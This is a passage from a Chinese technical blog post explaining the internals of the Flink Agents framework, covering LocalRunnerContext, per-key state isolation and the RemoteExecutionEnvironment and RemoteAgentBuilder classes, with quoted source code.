    __outputs: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]
    __config: AgentConfiguration

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, agent: Agent, config: AgentConfiguration</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Initialize the runner with the provided agent.

        Parameters
        ----------
        agent : Agent
            The agent class to convert and run.
        """</span>
        self.__agent_plan = AgentPlan.from_agent(agent, config)
        self.__keyed_contexts = {}
        self.__outputs = []
        self.__config = config
</code></pre>
<p>具体为：在执行过程中，LocalRunnerContext 通过 AgentPlan 获取资源和动作</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalRunnerContext</span>(<span class="hljs-title class_ inherited__">RunnerContext</span>):
    <span class="hljs-string">"""Implementation of RunnerContext for local agent execution.

    Attributes:
    ----------
    __agent_plan : AgentPlan
        Internal agent plan for this context.
    __key : Any
        Unique identifier for the context, correspond to the key in flink KeyedStream.
    events : deque[Event]
        Queue of events to be processed in this context.
    action_name: str
        Name of the action being executed.
    """</span>

    __agent_plan: AgentPlan
    __key: <span class="hljs-type">Any</span>
    events: deque[Event]
    action_name: <span class="hljs-built_in">str</span>
    _store: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]
    _short_term_memory: MemoryObject
    _config: AgentConfiguration

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, agent_plan: AgentPlan, key: <span class="hljs-type">Any</span>, config: AgentConfiguration</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Initialize a new context with the given agent and key.

        Parameters
        ----------
        agent_plan : AgentPlan
            Agent plan used for this context.
        key : Any
            Unique context identifier, which is corresponding to the key in flink
            KeyedStream.
        """</span>
        self.__agent_plan = agent_plan
        self.__key = key
        self.events = deque()
        self._store = {}
        self._short_term_memory = LocalMemoryObject(
            self._store, LocalMemoryObject.ROOT_KEY
        )
        self._config = config
        
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_resource</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span>, <span class="hljs-built_in">type</span>: ResourceType</span>) -&gt; Resource:
        <span class="hljs-keyword">return</span> self.__agent_plan.get_resource(name, <span class="hljs-built_in">type</span>)        
</code></pre>
<p>具体为：在事件处理中查找对应的动作</p>
<pre><code class="hljs language-python" lang="python">            <span class="hljs-keyword">for</span> action <span class="hljs-keyword">in</span> self.__agent_plan.get_actions(event_type):
                context.action_name = action.name
                func_result = action.<span class="hljs-built_in">exec</span>(event, context) <span class="hljs-comment"># 执行</span>
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(func_result, Generator):
                    <span class="hljs-keyword">try</span>:
                        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> func_result:
                            <span class="hljs-keyword">pass</span>
                    <span class="hljs-keyword">except</span> Exception:
                        logger.exception(<span class="hljs-string">"Error in async execution"</span>)
                        <span class="hljs-keyword">raise</span>
</code></pre>
<h5 data-id="heading-16">2.2.4 为什么要为每种 key 维护独立的上下文</h5>
<p>在 LocalRunner 中，每种 key 都有自己独立的上下文是为了模拟 Flink 流处理环境中 keyed state 的行为，并支持状态隔离和并发处理。</p>
<ul>
<li><strong>状态隔离</strong>：每个 key 对应的数据流需要维护自己的状态，避免不同 key 的数据相互干扰：</li>
</ul>

<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 不同 key 的状态完全隔离</span>
key1_context.short_term_memory.<span class="hljs-keyword">set</span>(<span class="hljs-string">"user_name"</span>, <span class="hljs-string">"Alice"</span>)
key2_context.short_term_memory.<span class="hljs-keyword">set</span>(<span class="hljs-string">"user_name"</span>, <span class="hljs-string">"Bob"</span>)
<span class="hljs-meta"># 两个 key 有不同的状态值，互不影响</span>
</code></pre>
<ul>
<li>
<p><strong>模拟 Flink 的 KeyedStream 行为</strong>：在 Flink 中，当使用 <code>keyBy()</code> 操作时，每个 key 会有独立的状态管理。LocalRunner 通过这种方式模拟了相同的行为：</p>
<ul>
<li>相同 key 的事件会在同一个上下文中处理</li>
<li>不同 key 的事件拥有各自独立的内存和事件队列</li>
</ul>
<p>这样保证了本地调试环境与实际 Flink 环境的一致性</p>
</li>
<li>
<p><strong>支持并发处理</strong>：虽然 LocalRunner 是单线程运行的，但它模拟了多 key 并发处理的情况：</p>
</li>
</ul>

<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 可以同时处理多个 key 的数据</span>
<span class="hljs-string">for</span> <span class="hljs-string">input_record</span> <span class="hljs-string">in</span> <span class="hljs-attr">inputs:</span>
    <span class="hljs-string">runner.run(**input_record)</span>  <span class="hljs-comment"># 每个 key 有独立上下文</span>
</code></pre>
<ul>
<li>
<p><strong>事件队列隔离</strong>：每个 key 都有自己的事件队列（events），这样可以保证：</p>
<ul>
<li>同一 key 的事件按顺序处理</li>
<li>不同 key 的事件不会互相影响处理顺序</li>
<li>每个 key 可以独立地维护待处理事件队列</li>
</ul>
</li>
<li>
<p><strong>内存状态管理</strong>：每个 LocalRunnerContext 都有自己的短期记忆对象（_short_term_memory），允许：</p>
</li>
</ul>

<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 每个 key 可以存储和检索自己的状态</span>
context.short_term_memory.<span class="hljs-keyword">set</span>(<span class="hljs-string">"step_count"</span>, <span class="hljs-number">1</span>)
context.short_term_memory.<span class="hljs-keyword">get</span>(<span class="hljs-string">"step_count"</span>)  <span class="hljs-meta"># 获取该 key 特定的状态</span>
</code></pre>
<h5 data-id="heading-17">2.2.5 实际应用场景示例</h5>
<p>考虑一个客户服务聊天机器人应用：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 用户 Alice 和 Bob 的对话分别用不同的 key 处理</span>
runner.run(<span class="hljs-attr">key</span>=<span class="hljs-string">"user_alice"</span>, value={<span class="hljs-string">"message"</span>: <span class="hljs-string">"Hello"</span>})
runner.run(<span class="hljs-attr">key</span>=<span class="hljs-string">"user_bob"</span>, value={<span class="hljs-string">"message"</span>: <span class="hljs-string">"Hi there"</span>})
<span class="hljs-comment"># 每个用户的对话历史和状态都独立保存</span>
<span class="hljs-comment"># Alice 的上下文不会影响 Bob 的上下文，反之亦然</span>
</code></pre>
<p>这种设计使 LocalRunner 能够准确模拟真实分布式环境中的行为，方便开发者在本地测试和调试复杂的状态依赖型代理应用。</p>
<h4 data-id="heading-18">2.3 LocalRunnerContext</h4>
<p>LocalRunnerContext 是 Flink Agents 框架中用于本地执行环境的运行上下文实现。它的主要功能是为每个 key 提供独立的执行环境，模拟 Flink 分布式环境中 keyed state 的行为，确保了在本地环境中能够准确模拟基于 key 的状态管理和事件处理流程。</p>
<h5 data-id="heading-19">2.3.1 设计目的</h5>
<p>LocalRunnerContext 的设计主要是为了：</p>
<ul>
<li>本地调试：在本地环境中模拟 Flink 分布式执行的行为</li>
<li>状态隔离：确保不同 key 的处理状态完全隔离，避免相互干扰</li>
<li>行为一致性：保证本地测试环境与实际 Flink 执行环境的行为一致</li>
<li>简化开发：提供与生产环境相同的 API 接口，方便开发者测试和调试</li>
</ul>
<h5 data-id="heading-20">2.3.2 主要功能</h5>
<ul>
<li>
<p>状态管理</p>
<ul>
<li>为每个 key 维护独立的短期内存状态（_short_term_memory）</li>
<li>提供内存对象的读写操作，确保不同 key 的状态隔离</li>
</ul>
</li>
<li>
<p>事件处理</p>
<ul>
<li>维护每个 key 的事件队列（events）</li>
<li>提供 send_event 方法将事件添加到处理队列中</li>
<li>记录事件处理日志，便于调试</li>
</ul>
</li>
<li>
<p>资源访问</p>
<ul>
<li>提供 get_resource 方法访问 agent 所需的资源（如模型、工具等）</li>
<li>根据资源名称和类型获取相应的资源实例</li>
</ul>
</li>
<li>
<p>配置管理</p>
<ul>
<li>提供对 action 配置的访问（action_config, get_action_config_value）</li>
<li>提供全局配置信息（config）</li>
</ul>
</li>
<li>
<p>度量和监控</p>
<ul>
<li>提供度量组访问接口（agent_metric_group, action_metric_group）</li>
<li>目前在本地环境中尚未完全实现</li>
</ul>
</li>
<li>
<p>异步执行支持</p>
<ul>
<li>提供 execute_async 方法支持异步函数执行</li>
<li>在本地环境中降级为同步执行并给出警告</li>
</ul>
</li>
</ul>
<h5 data-id="heading-21">2.3.3 定义</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalRunnerContext</span>(<span class="hljs-title class_ inherited__">RunnerContext</span>):
    <span class="hljs-string">"""Implementation of RunnerContext for local agent execution.

    Attributes:
    ----------
    __agent_plan : AgentPlan
        Internal agent plan for this context.
    __key : Any
        Unique identifier for the context, correspond to the key in flink KeyedStream.
    events : deque[Event]
        Queue of events to be processed in this context.
    action_name: str
        Name of the action being executed.
    """</span>

    __agent_plan: AgentPlan
    __key: <span class="hljs-type">Any</span>
    events: deque[Event]
    action_name: <span class="hljs-built_in">str</span>
    _store: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]
    _short_term_memory: MemoryObject
    _config: AgentConfiguration

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, agent_plan: AgentPlan, key: <span class="hljs-type">Any</span>, config: AgentConfiguration</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Initialize a new context with the given agent and key.

        Parameters
        ----------
        agent_plan : AgentPlan
            Agent plan used for this context.
        key : Any
            Unique context identifier, which is corresponding to the key in flink
            KeyedStream.
        """</span>
        self.__agent_plan = agent_plan
        self.__key = key
        self.events = deque()
        self._store = {}
        self._short_term_memory = LocalMemoryObject(
            self._store, LocalMemoryObject.ROOT_KEY
        )
        self._config = config

    @<span class="hljs-built_in">property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">Any</span>:
        <span class="hljs-string">"""Get the unique identifier for this context.

        Returns:
        -------
        Any
            The unique identifier for this context.
        """</span>
        <span class="hljs-keyword">return</span> self.__key

    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_event</span>(<span class="hljs-params">self, event: Event</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Send an event to the context's event queue and log it.

        Parameters
        ----------
        event : Event
            The event to be added to the queue.
        """</span>
        logger.info(<span class="hljs-string">"key: %s, send_event: %s"</span>, self.__key, event)
        self.events.append(event)

    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_resource</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span>, <span class="hljs-built_in">type</span>: ResourceType</span>) -&gt; Resource:
        <span class="hljs-keyword">return</span> self.__agent_plan.get_resource(name, <span class="hljs-built_in">type</span>)

    @<span class="hljs-built_in">property</span>
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">action_config</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]:
        <span class="hljs-string">"""Get config of the action."""</span>
        <span class="hljs-keyword">return</span> self.__agent_plan.get_action_config(action_name=self.action_name)

    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_action_config_value</span>(<span class="hljs-params">self, key: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Any</span>:
        <span class="hljs-string">"""Get config option value of the key."""</span>
        <span class="hljs-keyword">return</span> self.__agent_plan.get_action_config_value(
            action_name=self.action_name, key=key
        )

    @<span class="hljs-built_in">property</span>
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">short_term_memory</span>(<span class="hljs-params">self</span>) -&gt; MemoryObject:
        <span class="hljs-string">"""Get the short-term memory object associated with this context.

        Returns:
        -------
        MemoryObject
            The root object of the short-term memory.
        """</span>
        <span class="hljs-keyword">return</span> self._short_term_memory

    @<span class="hljs-built_in">property</span>
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">agent_metric_group</span>(<span class="hljs-params">self</span>) -&gt; MetricGroup:
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Support metric mechanism for local agent execution.</span>
        err_msg = <span class="hljs-string">"Metric mechanism is not supported for local agent execution yet."</span>
        <span class="hljs-keyword">raise</span> NotImplementedError(err_msg)

    @<span class="hljs-built_in">property</span>
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">action_metric_group</span>(<span class="hljs-params">self</span>) -&gt; MetricGroup:
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Support metric mechanism for local agent execution.</span>
        err_msg = <span class="hljs-string">"Metric mechanism is not supported for local agent execution yet."</span>
        <span class="hljs-keyword">raise</span> NotImplementedError(err_msg)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_async</span>(<span class="hljs-params">
        self,
        func: <span class="hljs-type">Callable</span>[[<span class="hljs-type">Any</span>], <span class="hljs-type">Any</span>],
        *args: <span class="hljs-type">Tuple</span>[<span class="hljs-type">Any</span>, ...],
        **kwargs: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>],
    </span>) -&gt; <span class="hljs-type">Any</span>:
        <span class="hljs-string">"""Asynchronously execute the provided function. Access to memory
        is prohibited within the function.
        """</span>
        logger.warning(
            <span class="hljs-string">"Local runner does not support asynchronous execution; falling back to synchronous execution."</span>
        )
        func_result = func(*args, **kwargs)
        <span class="hljs-keyword">yield</span>
        <span class="hljs-keyword">return</span> func_result

    @<span class="hljs-built_in">property</span>
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">config</span>(<span class="hljs-params">self</span>) -&gt; AgentConfiguration:
        <span class="hljs-keyword">return</span> self._config
</code></pre>
<h3 data-id="heading-22">0x03 RemoteExecutionEnvironment</h3>
<p><code>RemoteExecutionEnvironment</code> 是 Flink Agents 对原生 Flink <code>RemoteEnvironment</code> 的封装（适配 Agent 语义），是 Agent（智能体）与 Flink 集群融合的核心载体，核心目标是让 Agent 能够在 Flink 集群中处理 DataStream 和 Table 类型的流式数据，具体承担以下关键职责：</p>
<ul>
<li><code>RemoteExecutionEnvironment</code> 是 Flink Agents 实现 Agent 远程执行的核心环境组件，封装了远程集群连接、作业提交、资源管理等能力；</li>
<li>核心价值是<strong>屏蔽 Flink 远程执行的底层细节</strong>，让用户聚焦 Agent 逻辑定义，而非集群操作；</li>
<li>关键特性是兼容本地调试与远程执行，同时适配 Agent 特有的状态、事件、资源需求，是 Flink Agents 从 “本地单机” 走向 “分布式集群” 的核心支撑。</li>
<li>桥接 Agent 框架与 Flink 运行时：将 Agent 的执行逻辑嵌入 Flink 的 StreamExecutionEnvironment/StreamTableEnvironment，使 Agent 能利用 Flink 的分布式计算能力处理流式数据；</li>
<li>标准化 Agent 执行流程：提供统一的入口（fromDataStream/fromTable）、处理（apply Agent）、输出（toDataStream/toTable）接口，规范 Agent 在 Flink 中的数据处理链路；</li>
<li>配置管理：加载 Flink 集群中 Agent 的专属配置文件（config.yaml），为 Agent 执行提供环境配置支撑；</li>
<li>执行调度：最终触发 Flink 作业的执行（env.execute ()），完成 Agent 处理逻辑的分布式运行。</li>
</ul>
<h4 data-id="heading-23">3.1 核心特色</h4>









































<table><thead><tr><th>特色维度</th><th>具体说明</th></tr></thead><tbody><tr><td>环境适配性</td><td>专门面向 Flink 集群的<strong>远程执行</strong>场景设计，依赖 Flink 的流执行环境（StreamExecutionEnvironment）和表环境（StreamTableEnvironment），而非本地执行；</td></tr><tr><td>数据类型聚焦</td><td>仅支持 Flink 原生的 DataStream/Table 作为输入输出，明确禁用本地场景的 List 类型（fromList/toList），贴合流式计算场景；</td></tr><tr><td>分层设计</td><td>采用 “环境类（RemoteExecutionEnvironment）+ 构建器类（RemoteAgentBuilder）” 分层模式：环境类管控全局配置和 Flink 环境，构建器类聚焦单个 Agent 的执行链路；</td></tr><tr><td>灵活的 Key 选择</td><td>支持自定义 KeySelector 对输入数据分片，无自定义 Key 时默认使用数据自身作为 Key，适配不同的分布式处理需求；</td></tr><tr><td>配置解耦</td><td>从 Flink 配置目录加载 Agent 专属配置，配置文件与代码解耦，便于集群环境下的配置管理；</td></tr><tr><td>容错与校验</td><td>包含关键流程校验（如调用 toDataStream 前必须先 apply Agent）、空值处理（TableEnvironment 懒加载）、异常封装（配置加载 / Agent 执行异常统一抛出 RuntimeException）；</td></tr><tr><td>表与流互通</td><td>支持 Table 与 DataStream 的双向转换（Table 转 DataStream 作为 Agent 输入、DataStream 转 Table 作为输出），适配 Flink SQL / 流处理双场景；</td></tr><tr><td>资源关联</td><td>为 Agent 绑定运行时资源（resources），保障 Agent 执行所需的资源依赖；</td></tr></tbody></table>
<h4 data-id="heading-24">3.2 与原生 Flink RemoteEnvironment 的对比</h4>



































<table><thead><tr><th>特性</th><th>Flink 原生 RemoteEnvironment</th><th>Flink Agents RemoteExecutionEnvironment</th></tr></thead><tbody><tr><td>核心定位</td><td>通用 Flink Job 的远程执行环境</td><td>Agent 语义专属的远程执行环境</td></tr><tr><td>封装层级</td><td>底层 Flink Job 提交</td><td>上层 Agent/AgentPlan 提交</td></tr><tr><td>核心适配</td><td>无 Agent 语义，仅处理通用 JobGraph</td><td>适配 AgentPlan → JobGraph 编译、Agent 状态管理</td></tr><tr><td>资源管理</td><td>通用 Slot / 资源分配</td><td>按 Agent 实例隔离资源，适配工具 / 动作资源需求</td></tr><tr><td>事件 / 状态处理</td><td>无内置事件语义</td><td>封装 Agent 事件（Event）的跨集群传输、状态序列化</td></tr></tbody></table>
<h4 data-id="heading-25">3.3 如何使用 ActionExecutionOperator</h4>
<p>RemoteExecutionEnvironment 通过 Python 层的 RemoteAgentBuilder.to_datastream() 方法间接使用ActionExecutionOperator，过程为：</p>
<ul>
<li>用户定义了一个Agent并应用到执行环境中</li>
<li>调用 to_datastream() 方法触发实际的操作符创建</li>
<li>通过 JNI 调用 Java 层的 CompileUtils.connectToAgent() 方法</li>
<li>最终在 Flink 作业图中创建并配置 ActionExecutionOperator</li>
</ul>
<p>connectToAgent()中会：</p>
<ul>
<li>接收输入的 Java DATa Stream 对象</li>
<li>接收序列化的 AgentPlan（包含所有动作和资源配置）</li>
<li>创建并连接 ActionExecutionOperator 到数据流处理图中</li>
</ul>

<pre><code class="hljs language-lua" lang="lua">    // ============================ basic ====================================
    /**
     * Connects the given KeyedStream to the Flink Agents agent.
     *
     * &lt;p&gt;This method accepts a keyed DataStream <span class="hljs-keyword">and</span> applies the specified agent plan to it. The
     * source of the <span class="hljs-built_in">input</span> stream determines the data <span class="hljs-built_in">format</span>: Java streams provide Objects, <span class="hljs-keyword">while</span>
     * Python streams use serialized <span class="hljs-built_in">byte</span> arrays.
     *
     * @param keyedInputStream The <span class="hljs-built_in">input</span> keyed DataStream.
     * @param agentPlan The agent plan to be executed.
     * @param inputIsJava A flag indicating whether the <span class="hljs-built_in">input</span> stream originates from Java. - If
     *     <span class="hljs-literal">true</span>, <span class="hljs-built_in">input</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">output</span> types are Java Objects. - If <span class="hljs-literal">false</span>, <span class="hljs-built_in">input</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">output</span> types are
     *     <span class="hljs-built_in">byte</span>[].
     * @param &lt;K&gt; The <span class="hljs-built_in">type</span> of the key used <span class="hljs-keyword">in</span> the keyed DataStream.
     * @param &lt;IN&gt; The <span class="hljs-built_in">type</span> of the <span class="hljs-built_in">input</span> data (Object <span class="hljs-keyword">or</span> <span class="hljs-built_in">byte</span>[]).
     * @param &lt;OUT&gt; The <span class="hljs-built_in">type</span> of the <span class="hljs-built_in">output</span> data (Object <span class="hljs-keyword">or</span> <span class="hljs-built_in">byte</span>[]).
     * @<span class="hljs-keyword">return</span> The processed DataStream as the result of the agent.
     */
    private static &lt;K, IN, OUT&gt; DataStream&lt;OUT&gt; connectToAgent(
            KeyedStream&lt;IN, K&gt; keyedInputStream,
            AgentPlan agentPlan,
            TypeInformation&lt;OUT&gt; outTypeInformation,
            boolean inputIsJava) {
        <span class="hljs-keyword">return</span> (DataStream&lt;OUT&gt;)
                keyedInputStream
                        .transform(
                                <span class="hljs-string">"action-execute-operator"</span>,
                                outTypeInformation,
                                new ActionExecutionOperatorFactory(agentPlan, inputIsJava))
                        .setParallelism(keyedInputStream.getParallelism());
    }
</code></pre>
<h4 data-id="heading-26">3.4 典型流程</h4>
<p>当用户编写基于 RemoteExecutionEnvironment 的应用程序时，典型流程如下：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 获取Flink执行环境</span>
<span class="hljs-attr">env</span> = StreamExecutionEnvironment.get_execution_environment()
<span class="hljs-comment"># 创建 Agent 执行环境</span>
<span class="hljs-attr">agent_env</span> = AgentsExecutionEnvironment.get_execution_environment(env)
<span class="hljs-comment"># 添加所需资源</span>
agent_env.add_resource(...)
<span class="hljs-comment"># 设置输入数据流到Agent</span>
<span class="hljs-attr">input_stream</span> = agent_env.from_Collection(input_data) 
<span class="hljs-attr">builder</span> = agent_env.from_datastream(input_stream)
<span class="hljs-comment"># 应用代理逻辑</span>
<span class="hljs-attr">agent</span> = MyCustomAgent()
builder.apply(agent) 
<span class="hljs-comment"># 执行代理</span>
<span class="hljs-attr">output_stream</span> = builder.to_datastream()
env.execute()
</code></pre>
<h4 data-id="heading-27">3.5 交互逻辑</h4>
<p>RemoteExecutionEnvironment、ActionExecutionOperator 和 ActionTask 之间的交互逻辑如下。</p>
<p>这三个组件在 Flink Agents 框架中扮演不同的角色，协同工作来执行 Agent 逻辑：</p>
<ul>
<li><strong>RemoteExecutionEnvironment</strong>：提供远程执行环境，负责构建和连接 Agent 到 Flink 数据流</li>
<li><strong>ActionExecutionOperator</strong>：Flink 流处理操作符，实际执行 Agent 的动作逻辑</li>
<li><strong>ActionTask</strong>：表示单个动作执行任务的抽象概念</li>
</ul>
<p><strong>交互流程图解</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c78c2ac7b5654f51b4726e8bcea4434a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769090658&amp;x-signature=fAf8DK%2FKfvw7QRpfuBz4J9QiezI%3D" alt="Flink-7-1" loading="lazy"/></p>
<p>Flink-7-1</p>
<p>详细交互流程如下：</p>
<ol>
<li>初始化阶段</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2696b3427a48428aa1d26b983d56a307~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769090658&amp;x-signature=%2FtBgEcaGOMhj3I%2B5FvyC5olC%2FYQ%3D" alt="Flink-7-2" loading="lazy"/></p>
<p>Flink-7-2</p>
<ol start="2">
<li>运行时事件处理流程</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb379157ba8f46afb4087536e02dc3f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769090658&amp;x-signature=7FBNryBv%2BjsSTs7uY3tP%2BcXwELg%3D" alt="Flink-7-3" loading="lazy"/></p>
<p>Flink-7-3</p>
<h4 data-id="heading-28">3.6 实现</h4>
<p>RemoteAgentBuilder 的代码如下</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteAgentBuilder</span>(<span class="hljs-title class_ inherited__">AgentBuilder</span>):
    <span class="hljs-string">"""RemoteAgentBuilder for integrating datastream/table and agent."""</span>

    __<span class="hljs-built_in">input</span>: DataStream
    __agent_plan: AgentPlan = <span class="hljs-literal">None</span>
    __output: DataStream = <span class="hljs-literal">None</span>
    __t_env: StreamTableEnvironment
    __config: AgentConfiguration
    __resources: <span class="hljs-type">Dict</span>[ResourceType, <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]] = <span class="hljs-literal">None</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: DataStream,
        config: AgentConfiguration,
        t_env: StreamTableEnvironment | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        resources: <span class="hljs-type">Dict</span>[ResourceType, <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Init method of RemoteAgentBuilder."""</span>
        self.__<span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>
        self.__t_env = t_env
        self.__config = config
        self.__resources = resources

    @<span class="hljs-built_in">property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">t_env</span>(<span class="hljs-params">self</span>) -&gt; StreamTableEnvironment:
        <span class="hljs-string">"""Get or crate table environment."""</span>
        <span class="hljs-keyword">if</span> self.__t_env <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            self.__t_env = StreamTableEnvironment.create(
                stream_execution_environment=self.__env
            )
        <span class="hljs-keyword">return</span> self.__t_env

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">apply</span>(<span class="hljs-params">self, agent: Agent</span>) -&gt; <span class="hljs-string">"AgentBuilder"</span>:
        <span class="hljs-string">"""Set agent of execution environment.

        Parameters
        ----------
        agent : Agent
            The agent user defined to run in execution environment.
        """</span>
        <span class="hljs-keyword">if</span> self.__agent_plan <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            err_msg = <span class="hljs-string">"RemoteAgentBuilder doesn't support apply multiple agents yet."</span>
            <span class="hljs-keyword">raise</span> RuntimeError(err_msg)

        <span class="hljs-comment"># inspect refer actions and resources from env to agent.</span>
        <span class="hljs-keyword">for</span> <span class="hljs-built_in">type</span>, name_to_resource <span class="hljs-keyword">in</span> self.__resources.items():
            agent.resources[<span class="hljs-built_in">type</span>] = name_to_resource | agent.resources[<span class="hljs-built_in">type</span>]

        self.__agent_plan = AgentPlan.from_agent(agent, self.__config)

        <span class="hljs-keyword">return</span> self

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_datastream</span>(<span class="hljs-params">self, output_type: TypeInformation | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span></span>) -&gt; DataStream:
        <span class="hljs-string">"""Get output datastream of agent execution.

        Returns:
        -------
        DataStream
            Output datastream of agent execution.
        """</span>
        <span class="hljs-keyword">if</span> self.__agent_plan <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            err_msg = <span class="hljs-string">"Must apply agent before call to_datastream/to_table."</span>
            <span class="hljs-keyword">raise</span> RuntimeError(err_msg)

        <span class="hljs-comment"># return the same output datastream when call to_datastream multiple.</span>
        <span class="hljs-keyword">if</span> self.__output <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            j_data_stream_output = invoke_method(
                <span class="hljs-literal">None</span>,
                <span class="hljs-string">"org.apache.flink.agents.runtime.CompileUtils"</span>,
                <span class="hljs-string">"connectToAgent"</span>,
                [
                    self.__<span class="hljs-built_in">input</span>._j_data_stream,
                    self.__agent_plan.model_dump_json(serialize_as_any=<span class="hljs-literal">True</span>),
                ],
                [
                    <span class="hljs-string">"org.apache.flink.streaming.api.datastream.KeyedStream"</span>,
                    <span class="hljs-string">"java.lang.String"</span>,
                ],
            )
            output_stream = DataStream(j_data_stream_output)
            self.__output = output_stream.<span class="hljs-built_in">map</span>(
                <span class="hljs-keyword">lambda</span> x: cloudpickle.loads(x), output_type=output_type
            )
        <span class="hljs-keyword">return</span> self.__output

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_table</span>(<span class="hljs-params">self, schema: Schema, output_type: TypeInformation</span>) -&gt; Table:
        <span class="hljs-string">"""Get output Table of agent execution.

        Parameters
        ----------
        schema : Schema
            Indicate schema of the output table.
        output_type : TypeInformation
            Indicate schema corresponding type information.

        Returns:
        -------
        Table
            Output Table of agent execution.
        """</span>
        <span class="hljs-keyword">return</span> self.t_env.from_data_stream(self.to_datastream(output_type), schema)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">to_list</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]:
        <span class="hljs-string">"""Get output list of agent execution.

        This method is not supported for remote execution environments.
        """</span>
        msg = <span class="hljs-string">"RemoteAgentBuilder does not support to_list."</span>
        <span class="hljs-keyword">raise</span> NotImplementedError(msg)
</code></pre>
<p>RemoteExecutionEnvironment 的代码如下。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteExecutionEnvironment</span>(<span class="hljs-title class_ inherited__">AgentsExecutionEnvironment</span>):
    <span class="hljs-string">"""Implementation of AgentsExecutionEnvironment for execution with DataStream."""</span>

    __env: StreamExecutionEnvironment
    __t_env: StreamTableEnvironment
    __config: AgentConfiguration

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">
        self,
